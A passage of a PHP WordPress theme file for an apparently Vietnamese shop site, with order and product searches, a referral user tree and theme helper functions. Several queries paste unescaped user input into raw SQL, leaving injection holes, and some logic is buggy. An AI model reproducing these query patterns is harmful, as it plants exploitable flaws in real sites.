			$query.="AND post.post_date like '%".$ngay_dat."%'";	
		
		}
		if($nguoi_dat!="")
		{
		      $query.="
				 AND 
					(
						   post.ID IN
						   (
									select  posts.ID FROM $wpdb->posts  posts, $wpdb->postmeta  post_meta where 
										posts.ID = post_meta.post_id
										AND
										(post.post_status = 'publish' OR post.post_status = 'private' )
										AND post_type ='dat-hang'
										 AND
										(
										  post_meta.meta_key='nguoi_nhan'
										)
										AND
										(
										  post_meta.meta_value like '%".$nguoi_dat."%'	
										)
						   )
					)
			  ";
		}
		if($email!="")
		{
		      $query.="
				 AND 
					(
						   post.ID IN
						   (
									select  posts.ID FROM $wpdb->posts  posts, $wpdb->postmeta  post_meta where 
										posts.ID = post_meta.post_id
										AND
										(post.post_status = 'publish' OR post.post_status = 'private' )
										AND post_type ='dat-hang'
										 AND
										(
										  post_meta.meta_key='email'
										)
										AND
										(
										  post_meta.meta_value ='".$email."'
										)
						   )
					)
			  ";
		}
		if($so_dt!="")
		{
		      $query.="
				 AND 
					(
						   post.ID IN
						   (
									select  posts.ID FROM $wpdb->posts  posts, $wpdb->postmeta  post_meta where 
										posts.ID = post_meta.post_id
										AND
										(post.post_status = 'publish' OR post.post_status = 'private' )
										AND post_type ='dat-hang'
										 AND
										(
										  post_meta.meta_key='so_dien_thoai'
										)
										AND
										(
										  post_meta.meta_value ='".$so_dt."'
										)
						   )
					)
			  ";
		}
		$query.=" 
		order by $orderby
		LIMIT $start,$end
		
		";
		
		$sql = $wpdb->get_results($query);
		return $sql;
}


  function tip_plugin_get_terms($term_id) {	
	$img=z_taxonomy_image_url($term_id);
	
	if($img=="")
	{
		
		return $img;
	}
	
	return $img;
 }
  
function get_parent_first_taxonomy($taxonomy,$term_id)
{
	
  $cater=get_term_by('id',$term_id,$taxonomy);
  if($cater->parent==0)
  {
 
	 return($term_id);
	
  }
  else 
  {
		
	   $term_id=get_parent_first_taxonomy ($taxonomy,$cater->parent,$dau_ra);
	   return $term_id;
	
  }
 
 
  
}


function get_parent_first_taxonomy_1($taxonomy,$term_id,$name)
{
	
  $cater=get_term_by('id',$term_id,$taxonomy);
  if($cater->parent==0)
  {
	 $name.=$cater->name;
	 return($name);
	
  }
  else 
  {
	$name.=$cater->name." - ";
	   $name.=get_parent_first_taxonomy_1 ($taxonomy,$cater->parent,$dau_ra,$name);
	   return $name;
	
  }
 
 
  
}
function get_list_tree_user($id)
{
	global $wpdb;
    $query="
    select  * FROM $wpdb->usermeta  usermeta,$wpdb->users users where 
	users.ID = usermeta.user_id	
	AND usermeta.meta_key='id_parent'
	AND usermeta.meta_value=$id	
	order by users.ID desc;
	";	
	
    $sql = $wpdb->get_results($query);
    return $sql;
}

function get_de_qui_cay_user($id,$html,$ngay_bd,$ngay_kt)
{
    $kq=get_list_tree_user($id);
	$user=get_userdata($id);
	 
	  if(is_admin())
	  {
		  include("../wp-content/plugins/lang/lang.php");
		  $tr_xoa=' ==>

		 <a href="admin.php?page=quanlyf&id='.$id.'&task=xem_chi_tiet&ngay_bd='.$ngay_bd.'&ngay_kt='.$ngay_kt.'" class="them_con" > '.$lang_xem_chi_tiet.' </a> 
		 <a style="display:none" href="admin.php?page=quanlyf&id='.$id.'&task=them_con"  "  class="them_con" onclick="return confirm(\' '.$luu_y_quy_khach.'\')">'.$lang_them_con.' </a> 
         		  
		  <a style="display:none" href="admin.php?page=quanlyf&id='.$id.'&task=xoa" class="xoa_f" onclick="return confirm(\''.$lang_xoa_f_nay.'\')">'.$lang_xoa_f.'  </a>';
	  }
	if(count($kq)<0)		
	{						
      $tong_tien=get_price_don($id,$ngay_bd,$ngay_kt,0,1000);
	  $_SESSION["cay_tien"]+=$tong_tien;
	  $tong_tien=number_format($tong_tien, 0, ',', '.')." đ";	
	  $html.='<li><a  href="#"> VNK'.$user->ID.' - '.$user->display_name.'	<span>('.$tong_tien.')</span>	</a>';
	  if(is_admin())
	  {
		  $html.=$tr_xoa;
	  }
	    $html.='</li>';
	  return $html;	
	}		
	else	
	{	
		 $tong_tien=get_price_don($id,$ngay_bd,$ngay_kt,0,10000);
		  $_SESSION["cay_tien"]+=$tong_tien; 
	      $tong_tien=number_format($tong_tien, 0, ',', '.')." đ";
		  $so_luong=count($kq);
			$html.='
			<li class="has-sub">			
			<a > <label class="nuumber_label" > ('.$so_luong.') </label> - VNK'.$user->ID.' - '. $user->display_name.' 	<span>('.$tong_tien.')</span></a> 

			';
			if(is_admin())
			  {
				  $html.=$tr_xoa;
			  }
			
			$html.='	
			<ul>';				
			foreach ($kq as $child)	
			{						 
			   $html=get_de_qui_cay_user($child->ID,$html,$ngay_bd,$ngay_kt);							  					
			}											
		    $html.='				
			  </ul>				
			</li>';			   
	}
	
 
	return $html;
}

function  get_price_don($id,$ngay_bd,$ngay_kt,$star,$end)
{
	$tong_tien=0;
	$kq=get_my_post_with_name_custom_post('dat-hang',$id,'post_date desc',$star,$end);	
	 
	foreach($kq as $result)
	{
		 
			$date=$result->post_date;
		 
			
 
			$paymentDate=date('Y-m-d', strtotime($date));
			
			 
		    
			 if($ngay_bd==0)
		    {
				 $ngay_bd="20/04/2012";
			}
			if($ngay_kt==0)
		    {
				 $ngay_kt="20/04/2099";
			}
			
			$contractDateBegin = str_replace('/', '-', $ngay_bd);
			$contractDateBegin= date('Y-m-d', strtotime($contractDateBegin));
			
			
			/*$contractDateEnd = date('Y-m-d', strtotime($ngay_kt));*/
			
			$contractDateEnd = str_replace('/', '-', $ngay_kt);
			$contractDateEnd= date('Y-m-d', strtotime($contractDateEnd));
			
			 
		 
			if (($paymentDate > $contractDateBegin) && ($paymentDate < $contractDateEnd))
			{ 
				$user = get_userdata($result->post_author);
					
				$email=$user->user_email;
				$ho_ten=$user->display_name;
				$txt_so_dt=get_usermeta($result->post_author,'dien_thoai');	
				$txt_dia_chi=get_usermeta($result->post_author,'dia_chi');	
				$terms = get_the_terms( $result->ID, 'nhom-don-hang' );
				foreach($terms as $result1)
				{
					$tinh_trang= $result1->term_id;			
					break;
				}
				 
				if($tinh_trang==50)
				{
				 $tong_tien=$tong_tien+lay_gia_tri_postmeta($result->ID,"tong_tien");
				} 
			}
	}
	return $tong_tien;
}


function get_de_qui_cay_user_option($id,$html,$cap,$id_active)
{
    $kq=get_list_tree_user($id);
	$user=get_userdata($id);
	 $user_ho_ten=$result->display_name;
	$cap++;

	$gach="";
	for($i=0;$i<=$cap;$i++)
	{
		$gach.="--";
	}
	if(count($kq)<0)		
	{	
		$class="";
	  if($id_active==$id)
	  {
		  $class="selected";
	  }
      
	  $html.='<option class="option_cap_'.$cap.'" value="'.$id.'" '.$class.' >'.$gach.$user->display_name.' - '.$user->user_email.'</span>	</a></option>';
	  
	  return $html;	
	}		
	else	
	{	 
		$class="";
		if($id_active==$id)
		{
		  $class="selected";
		}
		
			$html.='<option class="option_cap_'.$cap.'" value="'.$id.' '.$class.'">'.$gach.$user->display_name.' - '.$user->user_email.'</span>	</a></option>';
	
			 			
			foreach ($kq as $child)	
			{						 
			   $html=get_de_qui_cay_user_option($child->ID,$html,$cap,$id_active);							  					
			}											
		    			   
	}
	
 
	return $html;
}


function get_comment_user($id_user,$orderby,$star,$end)
{
  global $wpdb;
   $query="
    select  * FROM $wpdb->comments comment Where
	comment.comment_approved=1
	AND 
	comment.user_id=$id_user
    order by $orderby
	LIMIT $star,$end
	
	";
	
    $sql = $wpdb->get_results($query);
    return $sql;
}


function login_css() {
wp_enqueue_style( 'login_css', get_template_directory_uri() . '/css/itgreencss.css' ); // duong dan den file css moi
}
add_action('login_head', 'login_css');
function remove_wp_admin_bar_logo() {
        global $wp_admin_bar;
  
        $wp_admin_bar->remove_menu('wp-logo');
}

function search_sp($key,$name_taxonomy_1,$id_danhmuc1,
 $name_taxonomy_2,$id_danhmuc2,$name_taxonomy_3,
 $id_danhmuc3,$name_taxonomy_4,$id_danhmuc4,$orderby,$star,$end)
 {
   global $wpdb;
    
	   $query="
	     select  * FROM $wpdb->posts  post where 		
		(post.post_status = 'publish' OR post.post_status = 'private')
		AND post_type='san-pham'	
		";
		if($key!="")
		{
			  $query.=" 
			  
			       AND
					(
					    post.post_title like '%".$key."%'
					   OR 
						(
							   post.ID IN
							   (
							     select  term_re.object_id 
								FROM 
								$wpdb->terms term,
								$wpdb->term_taxonomy term_tax,
								$wpdb->term_relationships term_re 
							   
								where 	
								 term.term_id=term_tax.term_id
								 AND term_tax.term_taxonomy_id=term_re.term_taxonomy_id
								 AND  term.name like '%".$key."%' 
								 
								)
						)				
					  
				 )
			  ";
			  
		}
		if($id_danhmuc1!=-1 && $id_danhmuc1!="" )
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_1'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_1,$id_danhmuc1).")	
					   )
				)
		  ";
		} 
		if($id_danhmuc2!=-1 && $id_danhmuc2!="" )
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_2'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_2,$id_danhmuc2).")	
					   )
				)
		  ";
		}
		if($id_danhmuc3!=-1 && $id_danhmuc3!="" )
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_3'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_3,$id_danhmuc3).")	
					   )
				)
		  ";
		}
		if($id_danhmuc4!=-1 && $id_danhmuc4!="" )
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_4'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_4,$id_danhmuc4).")	
					   )
				)
		  ";
		}
		
		$query.=" 
		order by $orderby
		LIMIT $star,$end
		
		";
		
	 
    $sql = $wpdb->get_results($query);
    return $sql;
 }
 
  
add_action('wp_before_admin_bar_render', 'remove_wp_admin_bar_logo', 0);


add_action('wp_dashboard_setup', 'my_custom_dashboard_widgets');
add_filter( 'admin_footer_text', '__return_empty_string', 11 );
add_filter( 'update_footer',     '__return_empty_string', 11 );
function my_custom_dashboard_widgets()
{
     global $wp_meta_boxes;
 
     // Right Now - Comments, Posts, Pages at a glance
     unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
 
     // Recent Comments
     unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
 
     // Incoming Links
     unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
  unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
     // Plugins - Popular, New and Recently updated WordPress Plugins
     unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
 
     // WordPress Development Blog Feed
     unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
 
     // Other WordPress News Feed
     unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
 
     // Quick Press Form
     unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
 
     // Recent Drafts List
     unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']);
	
 
}
/**
* Disable the emoji"s
*/
function disable_emojis() {
	remove_action( "wp_head", "print_emoji_detection_script", 7 );
	remove_action( "admin_print_scripts", "print_emoji_detection_script" );
	remove_action( "wp_print_styles", "print_emoji_styles" );
	remove_action( "admin_print_styles", "print_emoji_styles" );
	remove_filter( "the_content_feed", "wp_staticize_emoji" );
	remove_filter( "comment_text_rss", "wp_staticize_emoji" );
	remove_filter( "wp_mail", "wp_staticize_emoji_for_email" );
	add_filter( "tiny_mce_plugins", "disable_emojis_tinymce" );
}
add_action( "init", "disable_emojis" );
 
function disable_emojis_tinymce( $plugins ) {
	if ( is_array( $plugins ) ) {
	return array_diff( $plugins, array( "wpemoji" ) );
	} else {
	return array();
	}
}

function _remove_script_version( $src ){
$parts = explode( "?ver", $src );
return $parts[0];
}


add_filter( "script_loader_src", "_remove_script_version", 15, 1 );
add_filter( "style_loader_src", "_remove_script_version", 15, 1 );


// NEW

function get_archive_link_custom($post_type, $all)
{
	// get_archive_link_custom('san-pham', true)
	if ($all) {
		return get_post_type_archive_link($post_type);
	}
	$args = array(
		'posts_per_page'   => 10,
		// 'offset' => 0,
		'post_type' => $post_type,
		// 'orderby'          => 'menu_order',
		// 'orderby'          => 'meta_value_num',
		// 'meta_key' => 'count_views',
		// 'order'            => 'ASC',
		'suppress_filters' => false
	);
	$the_query = new WP_Query($args);

	if ($the_query->found_posts == 1) {
		if ($the_query->have_posts()) :
			while ($the_query->have_posts()) : $the_query->the_post();
				$result = get_post();
				return get_permalink($result->ID);
			endwhile;
		endif;

		// Reset Post Data
		wp_reset_postdata();
	} else {
		return get_post_type_archive_link($post_type);
	}
}

function get_taxonomy_link_custom($post_type, $custom_term, $all)
{
	if ($all) {
		return get_term_link($custom_term->slug, $custom_term->taxonomy);
	}
	$args = array(
		'posts_per_page'   => -1,
		// 'offset' => 0,
		'post_type' => $post_type,
		'orderby'          => 'menu_order',
		'order'            => 'ASC',
		'tax_query' => array(
			array(
				'taxonomy' => $custom_term->taxonomy,
				'field' => 'slug',
				'terms' => $custom_term->slug,
				'include_children' => true
			)
		),
		'suppress_filters' => false
	);
	$the_query = new WP_Query($args);

	if ($the_query->found_posts == 1) {
		if ($the_query->have_posts()) :
			while ($the_query->have_posts()) : $the_query->the_post();
				$result = get_post();
				return get_permalink($result->ID);
			endwhile;
		endif;

		// Reset Post Data
		wp_reset_postdata();
	} else {
		return get_term_link($custom_term->slug, $custom_term->taxonomy);
	}
}


function get_post_by_post_type($post_type, $orderby, $meta_key, $order, $post_per_page, $offset, $other_params)
{
	// get_post_by_post_type('san-pham', 'menu_order', null, 'ASC', -1, 0, null);
	// other_params: array(array("name", value))
	$args = array(
		'posts_per_page'   => $post_per_page,
		// 'offset' => 0,
		'post_type' => $post_type,
		'orderby'          => $orderby, //default
		// 'orderby'          => 'meta_value_num',
		// 'meta_key' => 'count_views',
		'order'            => $order,
		'suppress_filters' => false,
		// 'post__not_in' => array(1,2,3)
	);

	if ($meta_key) {
		$args['meta_key'] = $meta_key;
	}
	if ($offset) {
		$args['offset'] = $offset;
	}
	if ($other_params) {
		foreach ($other_params as $other_param_item) {
			$args[$other_param_item[0]] = $other_param_item[1];
		}
	}



	return new WP_Query($args);
}

function get_post_by_term($term_array, $post_type, $orderby, $meta_key, $order, $post_per_page, $offset, $other_params)
{
	// $term_array = array('OR', array(array('danh-muc-du-an', 'slug', 'xu-ly-rac-thai', true, 'IN'), array('danh-muc-du-an', 'slug', 'dien-nang-luong', true, 'IN')));
	// get_post_by_term(array('OR', array(array('danh-muc-du-an', 'slug', 'xu-ly-rac-thai', true, 'IN'))), array('san-pham'), 'menu_order', null, 'ASC', -1, 0, null)



	$args = array(
		'posts_per_page'   => $post_per_page,
		// 'offset' => 0,
		'post_type' => $post_type,
		'orderby'          => $orderby,
		'order'            => $order,
		'tax_query' => array(
			'relation' => $term_array[0]
		),
		'suppress_filters' => false
	);

	for ($i = 0; $i < count($term_array[1]); $i++) {
		$term = array(
			'taxonomy' => $term_array[1][$i][0],
			'field' => $term_array[1][$i][1],
			'terms' => $term_array[1][$i][2],
			'include_children' => $term_array[1][$i][3],
			'operator' => $term_array[1][$i][4]
		);
		array_push($args["tax_query"], $term);
	}

	if ($meta_key) {
		$args['meta_key'] = $meta_key;
	}
	if ($offset) {
		$args['offset'] = $offset;
	}
	if ($other_params) {
		foreach ($other_params as $other_param_item) {
			$args[$other_param_item[0]] = $other_param_item[1];
		}
	}

	return new WP_Query($args);;
}




function active_menu($d_name, $d_taxonomy, $d_term, $page_template)
{
	global $wpdb;

	// page
	if ($page_template) {
		if (is_page_template($page_template)) {
			return true;
		} else {
			return false;
		}
	}

	// term taxonomy
	if ($d_term) {
		if (is_singular()) {
			$upost_id = get_queried_object()->ID;
			$term_tax = get_the_terms($upost_id, $d_taxonomy);

			if (!empty($term_tax)) {
				foreach ($term_tax as $term) {
					$current_term_id = $term->term_id;
					while ($current_term_id != 0) {
						if ($current_term_id == $d_term->term_id) {
							return true;
						}
						$query2 = "select * from wp_term_taxonomy where taxonomy = '$d_taxonomy' and term_id = $current_term_id ";
						$result2 = $wpdb->get_results($query2);

						foreach ($result2 as $row2) {
							$current_term_id = $row2->parent;
						}
					}
				}
			}
		}
	}




	// is taxonomy
	if ($d_taxonomy) {
		if (is_tax($d_taxonomy)) {
			if (is_tax($d_taxonomy, $d_term->slug)) {
				return true;
			}
			$current_term_id = get_queried_object()->term_taxonomy_id;


			while ($current_term_id != 0) {
				if ($current_term_id == $d_term->term_id) {
					return true;
				}
				$query2 = "select * from wp_term_taxonomy where taxonomy = '$d_taxonomy' and term_id = $current_term_id ";
				$result2 = $wpdb->get_results($query2);

				foreach ($result2 as $row2) {
					$current_term_id = $row2->parent;
				}
			}
		}
	}



	// archive, single
	if ($d_name) {
		if (is_post_type_archive($d_name) || is_singular($d_name)) {
			return true;
		}
	}
	return false;
}

function get_post_full_custom($term_array, $post_type, $orderby, $meta_key, $order, $post_per_page, $offset, $other_params)
{
	// $term_array = array('OR', array(array('danh-muc-du-an', 'slug', 'xu-ly-rac-thai', true, 'IN'), array('danh-muc-du-an', 'slug', 'dien-nang-luong', true, 'IN')));
	// other_params: array(array("name", value))

	// get post by post type
	// get_post_full_custom(null, array('san-pham'), 'menu_order', null, 'ASC', -1, 0, null);

	// get post by term
	// get_post_full_custom(array('OR', array(array('danh-muc-du-an', 'slug', 'xu-ly-rac-thai', true, 'IN'))), array('san-pham'), 'menu_order', null, 'ASC', -1, 0, null)



	$args = array(
		'posts_per_page'   => $post_per_page,
		// 'offset' => 0,
		'post_type' => $post_type,
		'orderby'          => $orderby,
		// 'orderby'          => 'meta_value_num',
		// 'meta_key' => 'count_views',
		'order'            => $order,
		'suppress_filters' => false
	);

	if ($term_array) {
		$args["tax_query"] = array(
			'relation' => $term_array[0]
		);
		for ($i = 0; $i < count($term_array[1]); $i++) {
			$term = array(
				'taxonomy' => $term_array[1][$i][0],
				'field' => $term_array[1][$i][1],
				'terms' => $term_array[1][$i][2],
				'include_children' => $term_array[1][$i][3],
				'operator' => $term_array[1][$i][4]
			);
			array_push($args["tax_query"], $term);
		}
	}



	if ($meta_key) {
		$args['meta_key'] = $meta_key;
	}
	if ($offset) {
		$args['offset'] = $offset;
	}
	if ($other_params) {
		foreach ($other_params as $other_param_item) {
			$args[$other_param_item[0]] = $other_param_item[1];
		}
	}

	return new WP_Query($args);;
}

function get_term_by_taxonomy($taxonomy, $parent, $orderby, $meta_key, $order, $other_params)
{
	// get_term_by_taxonomy('danh-muc', 0, 'meta_value', 'tax-order', 'ASC', null)
	$args = array(
		'taxonomy' => $taxonomy,
		'hide_empty' => 0,
		// 'orderby' => 'name',
		'meta_key' => $meta_key,
		'orderby' => $orderby,
		'order' => $order,
		'parent' => $parent,
		'hide_empty' => 0
	);

	if ($meta_key) {
		$args['meta_key'] = $meta_key;
	}

	if ($other_params) {
		foreach ($other_params as $other_param_item) {
			$args[$other_param_item[0]] = $other_param_item[1];
		}
	}

	return new WP_Term_Query($args);
}

function show_all_post_by_post_type_custom($post_type, $orderby, $meta_key, $order, $post_per_page, $offset, $other_params, $show_first_ul)
{
	// show_all_post_by_post_type_custom('chinh-sach', 'menu_order', null, 'asc', -1, 0, null, false)
	$the_query = get_post_full_custom(null, $post_type, $orderby, $meta_key, $order, $post_per_page, $offset, $other_params);
	if ($the_query->found_posts > 0) {
		if ($show_first_ul) {
			echo "<ul>";
		}
		?>
		<?php
		// The Loop
		if ($the_query->have_posts()) :
			while ($the_query->have_posts()) : $the_query->the_post();
				$result = get_post();
				$name = $result->post_title;
				$img = get_image_size($result->ID, "images", "full");
				// $link = lay_gia_tri_postmeta($result->ID, "link");
				// $link = get_post_meta( $post->ID, $key = 'link', $single = false );
				$link = get_permalink($result->ID);
				$excerpt = wpautop($result->post_excerpt);
				$excerpt = wp_strip_all_tags($excerpt);
				$excerpt = sub_string($excerpt, 100);
		?>
				<li>
					<a href="<?php echo $link ?>"><?php echo $name ?></a>
				</li>
		<?php
			endwhile;
		endif;

		// Reset Post Data
		wp_reset_postdata();

		?>
		<?php
		if ($show_first_ul) {
			echo "</ul>";
		}
	}
}

function show_all_term_taxonomy_inherit($taxonomy, $parent, $show_first_ul, $post_type, $all, $other_params)
{
	// show_all_term_taxonomy_inherit('danh-muc', 0, true, 'san-pham', false, null);
	$term_query = get_term_by_taxonomy($taxonomy, $parent, 'meta_value', 'tax-order', 'ASC', $other_params);

	if (!empty($term_query->terms)) {
		if ($show_first_ul) {
			echo "<ul>";
		}

		foreach ($term_query->terms as $cater) {
			$name = $cater->name;
			$link = get_taxonomy_link_custom($post_type, $cater, $all);
			// $icon = get_field('font_awesome', $taxonomy . '_' . $cater->term_id);
			// $img = get_field('images', $taxonomy . '_' . $cater->term_id)['url'];

			$has_child = false;

			$term_query = get_term_by_taxonomy($taxonomy, $cater->term_id, 'meta_value', 'tax-order', 'ASC', $other_params);
			if (!empty($term_query->terms)) {
				$has_child = true;
			}
		?>
			<li <?php if (active_menu(null, $taxonomy, $cater, null)) {
					echo 'class = "active"';
				} ?>>
				<a href="<?php echo $link ?>" title=""><?php echo $name ?></a>
				<?php
				if ($has_child) {
				?>
					<!-- <i class="fa fa-angle-right"></i> -->
				<?php

					show_all_term_taxonomy_inherit($taxonomy, $cater->term_id, true, $post_type, $all, $other_params);
				}
				?>
			</li>
		<?php
		}
		if ($show_first_ul) {
			echo "</ul>";
		}
	}
}

function show_all_term_taxonomy_inherit_custom($taxonomy, $parent, $show_first_ul, $post_type, $all, $other_params)
{
	// show_all_term_taxonomy_inherit_custom('danh-muc', 0, true, 'san-pham', false, null);
	$term_query = get_term_by_taxonomy($taxonomy, $parent, 'meta_value', 'tax-order', 'ASC', $other_params);

	if (!empty($term_query->terms)) {
		if ($show_first_ul) {
			echo "<ul class='sub-menu collapse' id='list-item-$parent'>";
		}

		foreach ($term_query->terms as $cater) {
			$name = $cater->name;
			$link = get_taxonomy_link_custom($post_type, $cater, $all);
			// $icon = get_field('font_awesome', $taxonomy . '_' . $cater->term_id);
			// $img = get_field('images', $taxonomy . '_' . $cater->term_id)['url'];

			$has_child = false;

			$term_query = get_term_by_taxonomy($taxonomy, $cater->term_id, 'meta_value', 'tax-order', 'ASC', $other_params);
			if (!empty($term_query->terms)) {
				$has_child = true;
			}
		?>
			<li <?php if ($has_child) {
					echo 'class="has-sub"';
				} ?>>
				<a href="<?php echo $link ?>" title=""><?php echo $name ?></a>
				<?php
				if ($has_child) {
				?>
					<i class="fal fa-angle-down" aria-hidden="true" data-toggle="collapse" data-target="#list-item-<?php echo $cater->term_id ?>"></i>
				<?php

					show_all_term_taxonomy_inherit_custom($taxonomy, $cater->term_id, true, $post_type, $all, $other_params);
				}
				?>
			</li>
			<?php
		}
		if ($show_first_ul) {
			echo "</ul>";
		}
	}
}



function show_all_term_taxonomy_linear($taxonomy, $parent, $post_type, $all, $other_params)
{
	//   show_all_term_taxonomy_linear('danh-muc', 0, true, 'san-pham', false, null);
	$term_query = get_term_by_taxonomy($taxonomy, $parent, 'meta_value', 'tax-order', 'ASC', $other_params);

	if (!empty($term_query->terms)) {

		foreach ($term_query->terms as $cater) {
			$term_name = $cater->name;
			$term_link = get_taxonomy_link_custom($post_type, $cater, $all);
			$term_img = get_field('images', $taxonomy . '_' . $cater->term_id)["url"];
			$term_description = $cater->description;

			$show_home = get_field('show_home', $taxonomy . '_' . $cater->term_id);

			$has_child = false;

			$term_query = get_term_by_taxonomy($taxonomy, $cater->term_id, 'meta_value', 'tax-order', 'ASC', $other_params);
			if (!empty($term_query->terms)) {
				$has_child = true;
			}

			if ($show_home == 1) {
			?>
				<div>
					<a href="<?php echo $term_link ?>" title=""><?php echo $term_name ?></a>
				</div>
			<?php
			}


			if ($has_child) {
				show_all_term_taxonomy_linear($taxonomy, $cater->term_id, $post_type, $all, $other_params);
			}
			?>
			<?php
		}
	}
}

function show_post_in_term_taxonomy($taxonomy, $parent, $show_first_ul, $post_type, $all, $other_params)
{
	// show_post_in_term_taxonomy('danh-muc', 0, true, 'san-pham', false, null);
	$term_query = get_term_by_taxonomy($taxonomy, $parent, 'meta_value', 'tax-order', 'ASC', $other_params);

	if (!empty($term_query->terms)) {


		foreach ($term_query->terms as $cater) {

			$cater_name = $cater->name;
			$cater_link = get_taxonomy_link_custom($post_type, $cater, $all);
			// $icon = get_field('font_awesome', $taxonomy . '_' . $cater->term_id);
			// $img = get_field('images', $taxonomy . '_' . $cater->term_id)['url'];

			$has_child = false;

			$term_query = get_term_by_taxonomy($taxonomy, $cater->term_id, 'meta_value', 'tax-order', 'ASC', $other_params);
			if (!empty($term_query->terms)) {
				$has_child = true;
			}

			if (get_field('show_home', $taxonomy . '_' . $cater->term_id) != '') {
			?>
				<section class="d_segment_product umt_ct_seg">
					<div class="d_container">
						<div class="d_title"><?php echo $cater_name ?></div>

						<?php
						$the_query = get_post_full_custom(array('OR', array(array($taxonomy, 'slug', $cater->slug, true, 'IN'))), 'san-pham', 'menu_order', null, 'ASC', 8, 0, null);

						// The Loop
						if ($the_query->have_posts()) :
						?>
							<div class="umt_product_group">
								<?php
								while ($the_query->have_posts()) : $the_query->the_post();
									$result = get_post();
									$name = $result->post_title;

								?>
									<div class="offical_partner_product">
										<div class="product_item">
											<div class="product_title"><?php echo $name ?></div>
										</div>
									</div>
								<?php
								endwhile;
								?>
							</div>
							<div class="d_viewmore"><a href="<?php echo $cater_link ?>">Xem tất cả</a></div>
						<?php
						endif;

						// Reset Post Data
						wp_reset_postdata();
						?>

					</div>
					</div>
				</section>
			<?php
			}


			if ($has_child) {
			?>
				<!-- <i class="fa fa-angle-right"></i> -->
			<?php

				show_post_in_term_taxonomy($taxonomy, $cater->term_id, true, $post_type, $all, $other_params);
			}
			?>

<?php


		}
	}
}



?>